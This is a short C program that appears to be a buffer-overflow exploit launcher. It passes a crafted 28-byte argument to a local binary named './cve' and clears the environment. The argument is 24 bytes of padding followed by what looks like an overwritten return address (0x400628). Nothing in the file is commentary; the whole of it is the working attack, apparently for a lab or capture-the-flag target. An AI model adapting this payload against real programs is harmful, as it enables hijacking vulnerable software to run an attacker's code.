#include <unistd.h>

int main()
{
    char addr[28]  = { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0x28, 0x06, 0x40, 1 };
    char *newenviron[] = { NULL };

    char *argv[] = { "cve", addr, NULL };

    execve("./cve", argv, newenviron);

}
